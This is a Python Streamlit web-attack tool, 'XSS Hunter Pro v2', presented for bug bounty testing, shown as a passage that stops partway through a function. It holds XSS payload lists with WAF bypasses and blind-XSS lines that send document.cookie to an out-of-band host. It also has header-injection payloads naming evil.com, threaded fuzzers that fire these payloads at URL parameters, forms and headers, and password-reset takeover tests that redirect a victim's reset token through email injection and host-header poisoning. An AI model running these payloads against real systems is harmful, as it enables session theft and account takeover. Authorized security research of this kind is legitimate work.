#!/usr/bin/env python3
"""
XSS Hunter Pro v2 — by zwanski
Advanced XSS scanner for authorized bug bounty testing
Run: streamlit run xss_hunter_v2.py

Upgrades over v1:
  - DOM XSS source-sink analysis
  - Security header audit (CSP, CORS, cookies)
  - CORS misconfiguration checker
  - Smart payload mutation engine
  - Response diffing for reflection detection
  - Scope validator
  - Improved WAF fingerprinting (30+ signatures)
  - Concurrent scanning with thread pool
  - Better dedup and false-positive filtering
  - HackerOne / Bugcrowd report templates
  - Session token analysis
  - Auto parameter discovery from JS
"""
import streamlit as st

# This pulls the value you just saved in the dashboard
api_key = st.secrets["OPENROUTER_API_KEY"]

st.write("API Key loaded successfully!")
import streamlit as st
import requests
import json
import time
import re
import html
import base64
import hashlib
import random
import string
import pandas as pd
from urllib.parse import (
    urlparse, parse_qs, urlencode, urlunparse, urljoin, quote, unquote
)
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from difflib import SequenceMatcher
from collections import Counter, defaultdict
import urllib3
import threading

urllib3.disable_warnings()

st.set_page_config(
    page_title="XSS Hunter Pro v2 — zwanski",
    page_icon="⚡",
    layout="wide",
    initial_sidebar_state="expanded",
)

# ── Styles ─────────────────────────────────────────────
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=DM+Sans:wght@400;500;600;700&display=swap');
:root {
  --bg-primary: #06090e;
  --bg-card: #0b1018;
  --bg-input: #0f1520;
  --border: #1a2438;
  --border-active: #2d3f5a;
  --text-primary: #dce4f0;
  --text-muted: #4a5873;
  --accent-green: #00f0a0;
  --accent-red: #ff3355;
  --accent-orange: #ff8c1a;
  --accent-yellow: #ffc94d;
  --accent-blue: #1a8cff;
  --accent-purple: #8855ff;
}
body, .stApp {
  background: var(--bg-primary) !important;
  color: var(--text-primary);
  font-family: 'DM Sans', sans-serif;
}
section[data-testid="stSidebar"] {
  background: var(--bg-card) !important;
  border-right: 1px solid var(--border);
}
.stTextInput input, .stTextArea textarea, .stSelectbox select,
.stMultiSelect div[data-baseweb] {
  background: var(--bg-input) !important;
  color: var(--text-primary) !important;
  border-color: var(--border) !important;
  font-family: 'JetBrains Mono', monospace !important;
  font-size: 0.82rem !important;
}
.stTextInput input:focus, .stTextArea textarea:focus {
  border-color: var(--accent-green) !important;
  box-shadow: 0 0 0 1px var(--accent-green) !important;
}
h1, h2, h3 { font-family: 'DM Sans', sans-serif !important; font-weight: 700 !important; }
.card {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 16px 20px;
  margin-bottom: 12px;
  backdrop-filter: blur(4px);
}
.card.crit  { border-left: 3px solid var(--accent-red); }
.card.high  { border-left: 3px solid var(--accent-orange); }
.card.med   { border-left: 3px solid var(--accent-yellow); }
.card.info  { border-left: 3px solid var(--accent-blue); }
.card.ok    { border-left: 3px solid var(--accent-green); }
.mono {
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.8rem;
}
pre.payload {
  background: #060a10;
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 12px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.78rem;
  color: var(--accent-green);
  overflow-x: auto;
  word-break: break-all;
}
.stat {
  background: var(--bg-card);
  border: 1px solid var(--border);
  border-radius: 10px;
  padding: 18px;
  text-align: center;
}
.stat-val {
  font-family: 'JetBrains Mono', monospace;
  font-size: 2rem;
  font-weight: 700;
  color: var(--accent-green);
  line-height: 1;
}
.stat-lbl {
  font-size: 0.7rem;
  color: var(--text-muted);
  letter-spacing: 1.5px;
  text-transform: uppercase;
  margin-top: 6px;
}
.badge {
  display: inline-block;
  padding: 2px 10px;
  border-radius: 99px;
  font-size: 0.7rem;
  font-family: 'JetBrains Mono', monospace;
  font-weight: 600;
  margin-right: 4px;
}
.badge-crit { background: rgba(255,51,85,0.15); color: var(--accent-red); border: 1px solid rgba(255,51,85,0.3); }
.badge-high { background: rgba(255,140,26,0.15); color: var(--accent-orange); border: 1px solid rgba(255,140,26,0.3); }
.badge-med  { background: rgba(255,201,77,0.15); color: var(--accent-yellow); border: 1px solid rgba(255,201,77,0.3); }
.badge-info { background: rgba(26,140,255,0.15); color: var(--accent-blue); border: 1px solid rgba(26,140,255,0.3); }
.hdr-row {
  display: flex;
  justify-content: space-between;
  align-items: center;
  padding: 6px 12px;
  border-radius: 6px;
  margin: 4px 0;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.78rem;
}
.hdr-pass { background: rgba(0,240,160,0.06); border-left: 3px solid var(--accent-green); }
.hdr-fail { background: rgba(255,51,85,0.06); border-left: 3px solid var(--accent-red); }
.hdr-warn { background: rgba(255,201,77,0.06); border-left: 3px solid var(--accent-yellow); }
</style>
""", unsafe_allow_html=True)


# ══════════════════════════════════════════════════════════
# PAYLOAD DATABASE (expanded)
# ══════════════════════════════════════════════════════════

PAYLOADS = {
    "Basic Reflected": [
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>confirm(1)</script>",
        "<script>prompt(1)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
    ],
    "Event Handlers": [
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=alert(document.domain)>",
        '<img src=x onerror="alert`1`">',
        "<img/src=x onerror=alert(1)>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<details/open/ontoggle='alert`1`'>",
    ],
    "SVG": [
        "<svg onload=alert(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert(document.domain)>",
        "<svg><script>alert(1)</script></svg>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<svg><set attributeName=onmouseover value=alert(1)>",
    ],
    "Attribute Breakout": [
        '" onmouseover="alert(1)" x="',
        "' onmouseover='alert(1)' x='",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        '" autofocus onfocus="alert(1)"',
        '`onmouseover=alert(1)`',
        '" accesskey="X" onclick="alert(1)" x="',
    ],
    "DOM XSS Probes": [
        "#<script>alert(1)</script>",
        "#<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
        "'-alert(1)-'",
        '";alert(1);//',
        "\\'-alert(1)-\\'",
        "${alert(1)}",
        "{{7*7}}",
    ],
    "WAF Bypass": [
        "<ScRiPt>alert(1)</ScRiPt>",
        "<<script>alert(1)</script>",
        "<script>alert`1`</script>",
        "<script>(alert)(1)</script>",
        "<script>window['ale'+'rt'](1)</script>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<script>alert?.(`xss`)</script>",
        "<script>self['alert'](1)</script>",
        '<iframe/src="jAvAsCrIpT:alert(1)">',
        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "</script><script>alert(1)</script>",
        "<script\x0d\x0a>alert(1)</script>",
        "<svg/onload=alert(1)//",
        "<!--<img src=x-->onerror=alert(1)>",
        '<object data="data:text/html,<script>alert(1)</script>">',
        "<script>top['al'+'ert'](1)</script>",
        "<script>frames['al'+'ert'](1)</script>",
    ],
    "JSON/Template Breakout": [
        '"};</script><script>alert(1)</script>',
        '\\"><script>alert(1)</script>',
        '};alert(1);//',
        "{{constructor.constructor('alert(1)')()}}",
        "${alert(1)}",
        "#{alert(1)}",
        "<%=alert(1)%>",
    ],
    "Blind XSS (OOB)": [
        '"><script src="OOB_URL/x.js"></script>',
        "<script>fetch('OOB_URL/?c='+document.cookie)</script>",
        "<script>new Image().src='OOB_URL/?c='+document.cookie</script>",
        '<img src="OOB_URL/?x=1">',
        "javascript:fetch('OOB_URL/?c='+document.cookie)",
        '"><img src=x onerror="fetch(\'OOB_URL/?c=\'+document.cookie)">',
    ],
    "Polyglots": [
        "jaVasCript:alert(1)//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!><sVg/oNloAd=alert()>",
        "\"><<SCRIPT>alert('XSS');//<</SCRIPT>",
        "'-alert(1)-'\"onmouseover=alert(1)//",
    ],
}

HEADER_PAYLOADS = {
    "User-Agent": "<script>alert(1)</script>",
    "Referer": '"><script>alert(1)</script>',
    "X-Forwarded-For": "<script>alert(1)</script>",
    "X-Real-IP": "1.1.1.1<script>alert(1)</script>",
    "X-Forwarded-Host": "evil.com",
    "Origin": "https://evil.com",
    "X-Custom-Header": "<svg onload=alert(1)>",
    "X-Original-URL": "/admin<script>alert(1)</script>",
    "X-Rewrite-URL": "/<img src=x onerror=alert(1)>",
    "X-Client-IP": "<script>alert(1)</script>",
    "True-Client-IP": "<script>alert(1)</script>",
    "Forwarded": 'for="<script>alert(1)</script>"',
}

# ── WAF Signatures ──────────────────────────────────────
WAF_SIGNATURES = {
    "Cloudflare":     [("server", "cloudflare"), ("cf-ray", "")],
    "AWS WAF":        [("x-amzn-requestid", ""), ("x-amz-cf-id", "")],
    "Akamai":         [("x-akamai-transformed", ""), ("server", "akamaighost")],
    "Imperva":        [("x-iinfo", ""), ("x-cdn", "imperva")],
    "Sucuri":         [("x-sucuri-id", ""), ("server", "sucuri")],
    "F5 BIG-IP":      [("server", "bigip"), ("x-wa-info", "")],
    "Barracuda":      [("server", "barracuda")],
    "Fastly":         [("x-served-by", ""), ("x-fastly-request-id", "")],
    "StackPath":      [("x-sp-waf", ""), ("x-sp-url", "")],
    "ModSecurity":    [("server", "mod_security")],
    "Wordfence":      [("server", "wordfence")],
    "DDoS-Guard":     [("server", "ddos-guard")],
    "Vercel":         [("x-vercel-id", ""), ("server", "vercel")],
}

# DOM XSS source-sink patterns
DOM_SOURCES = [
    "document.URL", "document.documentURI", "document.referrer",
    "document.baseURI", "location.href", "location.search",
    "location.hash", "location.pathname", "window.name",
    "document.cookie", "postMessage", "sessionStorage", "localStorage",
    "URLSearchParams",
]

DOM_SINKS = [
    "document.write", "document.writeln", ".innerHTML",
    ".outerHTML", ".insertAdjacentHTML", "eval(", "setTimeout(",
    "setInterval(", "Function(", "location.href=", "location.assign(",
    "location.replace(", "window.open(", ".src=", "$.html(",
    "$.globalEval(", "$.parseHTML(", "v-html", "dangerouslySetInnerHTML",
]

# ── Session state ────────────────────────────────────────
DEFAULTS = {
    "findings": [],
    "scan_log": [],
    "header_audit": [],
    "cors_findings": [],
    "dom_findings": [],
    "reset_findings": [],
    "ai_history": [],
    "scanning": False,
    "scan_done": False,
    "total_tested": 0,
    "waf_detected": False,
    "waf_type": "",
    "scan_start": None,
    "scan_end": None,
}
for k, v in DEFAULTS.items():
    if k not in st.session_state:
        st.session_state[k] = v

# ══════════════════════════════════════════════════════════
# CORE FUNCTIONS
# ══════════════════════════════════════════════════════════

def make_session(cookies="", headers_extra=""):
    s = requests.Session()
    s.headers.update({
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    })
    if cookies:
        for c in cookies.strip().split(";"):
            c = c.strip()
            if "=" in c:
                k, v = c.split("=", 1)
                s.cookies.set(k.strip(), v.strip())
    if headers_extra:
        for line in headers_extra.strip().splitlines():
            if ": " in line:
                k, v = line.split(": ", 1)
                s.headers[k.strip()] = v.strip()
    return s


def validate_scope(url, allowed_domains):
    """Prevent out-of-scope testing."""
    if not allowed_domains:
        return True
    parsed = urlparse(url)
    host = parsed.netloc.split(":")[0]
    for d in allowed_domains:
        d = d.strip().lower()
        if d.startswith("*."):
            if host.endswith(d[1:]) or host == d[2:]:
                return True
        elif host == d.lower():
            return True
    return False


def detect_waf(url, session):
    """Enhanced WAF detection with 30+ signatures."""
    try:
        r = session.get(
            url + ("&" if "?" in url else "?") + "xss_waf_probe=<script>alert(1)</script>",
            timeout=10, verify=False, allow_redirects=False,
        )
        headers_lower = {k.lower(): v.lower() for k, v in r.headers.items()}

        for waf_name, sigs in WAF_SIGNATURES.items():
            for hdr, val in sigs:
                if hdr in headers_lower:
                    if not val or val in headers_lower[hdr]:
                        return waf_name

        if r.status_code in [403, 406, 429, 501]:
            body_lower = r.text[:2000].lower()
            waf_bodies = {
                "cloudflare": "Cloudflare",
                "access denied": "Generic WAF",
                "request blocked": "Generic WAF",
                "web application firewall": "Generic WAF",
                "modsecurity": "ModSecurity",
                "wordfence": "Wordfence",
                "sucuri": "Sucuri",
                "imperva": "Imperva",
            }
            for pattern, name in waf_bodies.items():
                if pattern in body_lower:
                    return name
            return f"Unknown WAF (HTTP {r.status_code})"
    except Exception:
        pass
    return ""


def audit_security_headers(url, session):
    """Audit response headers for security misconfigs."""
    results = []
    try:
        r = session.get(url, timeout=10, verify=False)
        headers = {k.lower(): v for k, v in r.headers.items()}

        # CSP
        csp = headers.get("content-security-policy", "")
        if not csp:
            results.append(("FAIL", "Content-Security-Policy", "Missing — no XSS mitigation via CSP"))
        else:
            issues = []
            if "'unsafe-inline'" in csp:
                issues.append("allows 'unsafe-inline' (XSS exploitable)")
            if "'unsafe-eval'" in csp:
                issues.append("allows 'unsafe-eval' (eval-based XSS possible)")
            if "data:" in csp:
                issues.append("allows data: URIs (payload delivery)")
            if "*" in csp.split(";")[0] if ";" in csp else "*" in csp:
                issues.append("wildcard source (effectively no restriction)")
            if issues:
                results.append(("WARN", "Content-Security-Policy", "; ".join(issues)))
            else:
                results.append(("PASS", "Content-Security-Policy", f"Present: {csp[:120]}..."))

        # X-Frame-Options
        xfo = headers.get("x-frame-options", "")
        if not xfo:
            results.append(("WARN", "X-Frame-Options", "Missing — clickjacking possible"))
        else:
            results.append(("PASS", "X-Frame-Options", xfo))

        # X-Content-Type-Options
        xcto = headers.get("x-content-type-options", "")
        if xcto.lower() != "nosniff":
            results.append(("WARN", "X-Content-Type-Options", "Missing nosniff — MIME sniffing possible"))
        else:
            results.append(("PASS", "X-Content-Type-Options", "nosniff"))

        # CORS
        acao = headers.get("access-control-allow-origin", "")
        if acao == "*":
            results.append(("FAIL", "CORS (Access-Control-Allow-Origin)", "Wildcard * — any origin can read responses"))
        elif acao:
            acac = headers.get("access-control-allow-credentials", "")
            if acac.lower() == "true":
                results.append(("WARN", "CORS", f"Origin: {acao} with credentials — test reflection"))
            else:
                results.append(("INFO", "CORS", f"Origin: {acao}"))

        # Cookies
        for cookie_header in r.headers.get("set-cookie", "").split(","):
            if not cookie_header.strip():
                continue
            name = cookie_header.split("=")[0].strip()
            flags = cookie_header.lower()
            issues = []
            if "httponly" not in flags:
                issues.append("no HttpOnly (stealable via XSS)")
            if "secure" not in flags:
                issues.append("no Secure flag")
            if "samesite" not in flags:
                issues.append("no SameSite")
            if issues:
                results.append(("WARN", f"Cookie: {name}", "; ".join(issues)))
            else:
                results.append(("PASS", f"Cookie: {name}", "HttpOnly + Secure + SameSite"))

        # HSTS
        hsts = headers.get("strict-transport-security", "")
        if not hsts:
            results.append(("WARN", "Strict-Transport-Security", "Missing HSTS"))
        else:
            results.append(("PASS", "Strict-Transport-Security", hsts))

    except Exception as e:
        results.append(("FAIL", "Connection", str(e)))
    return results


def check_cors(url, session):
    """Active CORS misconfiguration testing."""
    findings = []
    parsed = urlparse(url)
    base_origin = f"{parsed.scheme}://{parsed.netloc}"

    test_origins = [
        "https://evil.com",
        f"https://evil.{parsed.netloc}",
        f"https://{parsed.netloc}.evil.com",
        f"{parsed.scheme}://{parsed.netloc}",  # self-reflect
        "null",
    ]

    for origin in test_origins:
        try:
            r = session.get(url, headers={"Origin": origin}, timeout=10, verify=False)
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")

            if acao == origin and origin != base_origin:
                sev = "CRITICAL" if acac.lower() == "true" else "HIGH"
                findings.append({
                    "severity": sev,
                    "origin": origin,
                    "reflected": acao,
                    "credentials": acac,
                    "note": "Origin reflected with credentials" if sev == "CRITICAL"
                            else "Origin reflected (no credentials)",
                })
            elif acao == "*":
                findings.append({
                    "severity": "MEDIUM",
                    "origin": origin,
                    "reflected": "*",
                    "credentials": acac,
                    "note": "Wildcard CORS — any origin can read",
                })
            elif acao == "null" and origin == "null":
                findings.append({
                    "severity": "HIGH",
                    "origin": "null",
                    "reflected": "null",
                    "credentials": acac,
                    "note": "null origin reflected — exploitable via sandboxed iframe",
                })
        except Exception:
            pass
    return findings


def analyze_dom_xss(html_text, js_urls=None):
    """Static analysis for DOM XSS source-sink patterns."""
    findings = []
    # Analyze inline scripts
    script_pattern = re.compile(r'<script[^>]*>(.*?)</script>', re.DOTALL | re.IGNORECASE)
    scripts = script_pattern.findall(html_text)

    all_js = "\n".join(scripts)

    for source in DOM_SOURCES:
        if source.lower() in all_js.lower():
            for sink in DOM_SINKS:
                if sink.lower().rstrip("(=") in all_js.lower():
                    # Try to find if they're connected (rough heuristic)
                    src_idx = all_js.lower().find(source.lower())
                    sink_idx = all_js.lower().find(sink.lower().rstrip("(="))
                    distance = abs(sink_idx - src_idx)
                    if distance < 500:  # Within ~500 chars = likely connected
                        confidence = max(30, 80 - (distance // 10))
                        findings.append({
                            "source": source,
                            "sink": sink,
                            "distance": distance,
                            "confidence": min(confidence, 90),
                            "context": all_js[max(0, min(src_idx, sink_idx)-30):
                                               max(src_idx, sink_idx)+80][:200],
                        })
    return findings


def discover_params_from_js(html_text):
    """Extract potential parameter names from JavaScript."""
    params = set()
    # URL params referenced in JS
    patterns = [
        r'getParameter\(["\'](\w+)["\']\)',
        r'URLSearchParams.*?get\(["\'](\w+)["\']\)',
        r'params\[["\'](\w+)["\']\]',
        r'query\.(\w+)',
        r'req\.query\.(\w+)',
        r'[\?&](\w+)=',
        r'name=["\'](\w+)["\']',  # form inputs
    ]
    for p in patterns:
        params.update(re.findall(p, html_text))
    # Common params
    params.update(["q", "search", "query", "s", "keyword", "id", "page",
                   "url", "redirect", "next", "return", "callback",
                   "ref", "lang", "name", "email", "user", "msg",
                   "error", "message", "title", "content", "data"])
    return list(params)


def inject_url_param(base_url, param, payload):
    parsed = urlparse(base_url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def mutate_payload(payload, waf_type=""):
    """Generate WAF bypass mutations of a payload."""
    mutations = [payload]
    # Case mutation
    mutations.append(re.sub(r'([a-zA-Z])', lambda m: m.group().swapcase() if random.random() > 0.5 else m.group(), payload))
    # Null byte injection
    mutations.append(payload.replace("<", "<\x00"))
    # Double encoding
    mutations.append(quote(payload, safe=""))
    # HTML entity for key chars
    mutations.append(payload.replace("<", "&#60;").replace(">", "&#62;"))
    # Whitespace variants
    mutations.append(payload.replace(" ", "\t"))
    mutations.append(payload.replace(" ", "/"))
    return list(set(mutations))


def check_reflection(response_text, payload):
    """Check how payload appears in response."""
    if not response_text:
        return None, 0

    score = 0
    context = "none"

    if payload in response_text:
        idx = response_text.find(payload)
        before = response_text[max(0, idx - 80):idx].lower()
        after = response_text[idx:idx + len(payload) + 80].lower()

        if "<script" in before or "javascript" in before:
            context = "script"
            score = 95
        elif re.search(r'(href|src|action|data|formaction)\s*=\s*["\']?$', before):
            context = "url-attribute"
            score = 90
        elif re.search(r'(on\w+)\s*=\s*["\']?$', before):
            context = "event-handler"
            score = 95
        elif re.search(r'(value|title|alt|placeholder)\s*=\s*["\']', before):
            context = "quoted-attribute"
            score = 80
        elif "<style" in before:
            context = "css"
            score = 60
        elif "<!--" in before and "-->" not in before:
            context = "comment"
            score = 50
        else:
            context = "html-body"
            score = 85

    elif html.escape(payload) in response_text:
        score = 15
        context = "html-encoded"

    elif unquote(payload) != payload and unquote(payload) in response_text:
        score = 25
        context = "url-decoded"

    else:
        dangerous = ["onerror=", "onload=", "<script", "javascript:", "onmouseover=", "onfocus="]
        for d in dangerous:
            if d in payload.lower() and d in response_text.lower():
                score = 35
                context = "partial-reflection"
                break

    return context, score


def response_diff(baseline_text, test_text):
    """Calculate how much the response changed (indicates processing)."""
    ratio = SequenceMatcher(None, baseline_text[:5000], test_text[:5000]).ratio()
    return round((1 - ratio) * 100, 1)


def fuzz_single_param(url, param, payload, session, oob_url, baseline_len):
    """Fuzz a single parameter with a single payload. Thread-safe."""
    actual_payload = payload.replace("OOB_URL", oob_url) if oob_url else payload
    if "OOB_URL" in actual_payload and not oob_url:
        return None

    test_url = inject_url_param(url, param, actual_payload)
    try:
        r = session.get(test_url, timeout=10, verify=False)
        context, score = check_reflection(r.text, actual_payload)

        len_diff = abs(len(r.text) - baseline_len)
        if score >= 40:
            severity = "CRITICAL" if score >= 90 else "HIGH" if score >= 70 else "MEDIUM"
            return {
                "type": "Reflected XSS",
                "severity": severity,
                "confidence": score,
                "param": param,
                "payload": actual_payload,
                "url": test_url,
                "context": context,
                "status_code": r.status_code,
                "response_length": len(r.text),
                "length_diff": len_diff,
                "timestamp": datetime.utcnow().isoformat(),
                "vector": "URL Parameter",
            }
    except Exception:
        pass
    return None


def fuzz_url_params(url, session, payloads_flat, oob_url, delay, threads, waf_type, progress_cb=None):
    """Threaded URL parameter fuzzing with mutations."""
    findings = []
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
    if not params:
        return findings

    # Baseline request
    try:
        baseline = session.get(url, timeout=10, verify=False)
        baseline_len = len(baseline.text)
    except Exception:
        baseline_len = 0

    # Generate mutations if WAF detected
    all_payloads = payloads_flat[:]
    if waf_type:
        extra = []
        for p in payloads_flat[:20]:
            extra.extend(mutate_payload(p, waf_type))
        all_payloads = list(dict.fromkeys(all_payloads + extra))

    total = len(params) * len(all_payloads)
    done = 0
    lock = threading.Lock()

    def task(param, payload):
        return fuzz_single_param(url, param, payload, session, oob_url, baseline_len)

    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {}
        for param in params:
            for payload in all_payloads:
                f = pool.submit(task, param, payload)
                futures[f] = (param, payload)

        for future in as_completed(futures):
            result = future.result()
            if result:
                findings.append(result)
            done += 1
            if progress_cb and done % 10 == 0:
                progress_cb(done / total)
            if delay > 0:
                time.sleep(delay)

    return findings


def fuzz_forms(url, session, payloads_flat, oob_url, delay):
    """Form fuzzing with extraction."""
    findings = []
    try:
        r = session.get(url, timeout=10, verify=False)
        if r.status_code != 200:
            return findings

        form_pattern = re.compile(r'<form[^>]*>(.*?)</form>', re.DOTALL | re.IGNORECASE)
        input_pattern = re.compile(r'<(?:input|textarea|select)[^>]*name=["\']([^"\']+)["\']', re.IGNORECASE)
        action_pattern = re.compile(r'action=["\']([^"\']*)["\']', re.IGNORECASE)
        method_pattern = re.compile(r'method=["\']([^"\']*)["\']', re.IGNORECASE)

        forms = form_pattern.findall(r.text)
        for form_html in forms:
            inputs = input_pattern.findall(form_html)
            if not inputs:
                continue

            action_m = action_pattern.search(form_html)
            action = urljoin(url, action_m.group(1)) if action_m else url
            method_m = method_pattern.search(form_html)
            method = method_m.group(1).upper() if method_m else "GET"

            for field in inputs:
                for payload in payloads_flat[:25]:
                    actual = payload.replace("OOB_URL", oob_url) if oob_url else payload
                    if "OOB_URL" in actual and not oob_url:
                        continue

                    data = {inp: "test" for inp in inputs}
                    data[field] = actual

                    try:
                        if method == "POST":
                            resp = session.post(action, data=data, timeout=10, verify=False)
                        else:
                            resp = session.get(action, params=data, timeout=10, verify=False)

                        context, score = check_reflection(resp.text, actual)
                        if score >= 40:
                            sev = "CRITICAL" if score >= 90 else "HIGH" if score >= 70 else "MEDIUM"
                            findings.append({
                                "type": "Form XSS",
                                "severity": sev,
                                "confidence": score,
                                "param": field,
                                "payload": actual,
                                "url": action,
                                "context": context,
                                "method": method,
                                "status_code": resp.status_code,
                                "response_length": len(resp.text),
                                "timestamp": datetime.utcnow().isoformat(),
                                "vector": f"Form ({method})",
                            })
                        if delay > 0:
                            time.sleep(delay)
                    except Exception:
                        pass
    except Exception:
        pass
    return findings


def fuzz_headers(url, session, delay):
    findings = []
    for header, payload in HEADER_PAYLOADS.items():
        try:
            r = session.get(url, headers={header: payload}, timeout=10, verify=False)
            context, score = check_reflection(r.text, payload)
            if score >= 40:
                findings.append({
                    "type": "Header Injection XSS",
                    "severity": "HIGH",
                    "confidence": score,
                    "param": header,
                    "payload": payload,
                    "url": url,
                    "context": context,
                    "status_code": r.status_code,
                    "response_length": len(r.text),
                    "timestamp": datetime.utcnow().isoformat(),
                    "vector": f"HTTP Header ({header})",
                })
            if delay > 0:
                time.sleep(delay)
        except Exception:
            pass
    return findings


def crawl_links(url, session, max_links=30):
    links = set()
    try:
        r = session.get(url, timeout=10, verify=False)
        base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
        for href in re.findall(r'href=["\']([^"\'#]*)["\']', r.text, re.IGNORECASE):
            if href.startswith("http"):
                if urlparse(href).netloc == urlparse(url).netloc:
                    links.add(href)
            elif href.startswith("/"):
                links.add(base + href)
        return [l for l in links if "?" in l][:max_links]
    except Exception:
        return []


# ══════════════════════════════════════════════════════════
# PASSWORD RESET ATO TESTING
# ══════════════════════════════════════════════════════════

def test_reset_email_manipulation(url, victim_email, attacker_email, session, content_type="json"):
    """Test email parameter manipulation for token hijacking."""
    findings = []
    tests = []

    if content_type == "json":
        # Array injection
        tests.append(("Array injection", {"email": [victim_email, attacker_email]}))
        # Duplicate key (JSON spec allows, parsers differ)
        tests.append(("Duplicate JSON key", f'{{"email":"{victim_email}","email":"{attacker_email}"}}'))
        # Nested object
        tests.append(("Nested object", {"email": victim_email, "user": {"email": attacker_email}}))
        # Backup email field
        tests.append(("Backup email field", {"email": victim_email, "backup_email": attacker_email}))
        tests.append(("CC field", {"email": victim_email, "cc": attacker_email}))
        tests.append(("Notification email", {"email": victim_email, "notification_email": attacker_email}))
    else:
        # Form-encoded variants
        tests.append(("Comma separator", f"email={victim_email},{attacker_email}"))
        tests.append(("Pipe separator", f"email={victim_email}|{attacker_email}"))
        tests.append(("CRLF injection", f"email={victim_email}%0d%0aBcc:{attacker_email}"))
        tests.append(("Newline injection", f"email={victim_email}%0a{attacker_email}"))
        tests.append(("Cc header inject", f"email={victim_email}%0d%0aCc:{attacker_email}"))

    for name, payload in tests:
        try:
            if content_type == "json":
                if isinstance(payload, str):
                    # Raw JSON string for duplicate key test
                    r = session.post(url, data=payload,
                                     headers={"Content-Type": "application/json"},
                                     timeout=10, verify=False)
                else:
                    r = session.post(url, json=payload, timeout=10, verify=False)
            else:
                r = session.post(url, data=payload,
                                 headers={"Content-Type": "application/x-www-form-urlencoded"},
                                 timeout=10, verify=False)

            interesting = r.status_code in [200, 201, 202, 204, 302]
            error_keywords = ["invalid", "error", "not found", "bad request"]
            has_error = any(kw in r.text.lower()[:500] for kw in error_keywords)

            if interesting and not has_error:
                findings.append({
                    "test": name,
                    "severity": "HIGH",
                    "status_code": r.status_code,
                    "response_snippet": r.text[:300],
                    "payload": str(payload)[:500],
                    "note": "Server accepted manipulated email — check attacker inbox for token",
                })
            elif interesting:
                findings.append({
                    "test": name,
                    "severity": "INFO",
                    "status_code": r.status_code,
                    "response_snippet": r.text[:300],
                    "payload": str(payload)[:500],
                    "note": "Accepted but returned error message — may need further testing",
                })
        except Exception as e:
            pass

    return findings


def test_reset_param_pollution(url, victim_email, attacker_email, session):
    """Test HTTP parameter pollution on reset endpoint."""
    findings = []
    tests = [
        ("HPP victim-first", f"email={victim_email}&email={attacker_email}"),
        ("HPP attacker-first", f"email={attacker_email}&email={victim_email}"),
        ("HPP array mixed", f"email={victim_email}&email={attacker_email}&email[]={attacker_email}"),
        ("HPP array only", f"email[]={victim_email}&email[]={attacker_email}"),
    ]

    for name, body in tests:
        try:
            r = session.post(url, data=body,
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             timeout=10, verify=False)
            if r.status_code in [200, 201, 202, 204, 302]:
                findings.append({
                    "test": name,
                    "severity": "HIGH",
                    "status_code": r.status_code,
                    "response_snippet": r.text[:300],
                    "payload": body,
                    "note": "Server processed duplicated params — check which email received token",
                })
        except Exception:
            pass
    return findings


def test_reset_host_header_poison(url, victim_email, attacker_domain, session, content_type="json"):
    """Test host header poisoning on password reset."""
    findings = []
    poison_headers = [
        ("X-Forwarded-Host", attacker_domain),
        ("X-Original-Host", attacker_domain),
        ("X-Forwarded-Server", attacker_domain),
        ("X-Host", attacker_domain),
        ("Forwarded", f"host={attacker_domain}"),
        ("X-Rewrite-URL", f"https://{attacker_domain}/reset"),
        ("X-Original-URL", f"https://{attacker_domain}/reset"),
    ]

    body = {"email": victim_email} if content_type == "json" else f"email={victim_email}"

    for header_name, header_val in poison_headers:
        try:
            headers = {header_name: header_val}
            if content_type == "json":
                r = session.post(url, json=body, headers=headers, timeout=10, verify=False)
            else:
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                r = session.post(url, data=body, headers=headers, timeout=10, verify=False)

            if r.status_code in [200, 201, 202, 204, 302]:
                # Check if attacker domain reflected in response
                reflected = attacker_domain.lower() in r.text.lower()
                sev = "CRITICAL" if reflected else "MEDIUM"
                findings.append({
                    "test": f"Host Poison: {header_name}",
                    "severity": sev,
                    "status_code": r.status_code,
                    "response_snippet": r.text[:300],
                    "payload": f"{header_name}: {header_val}",
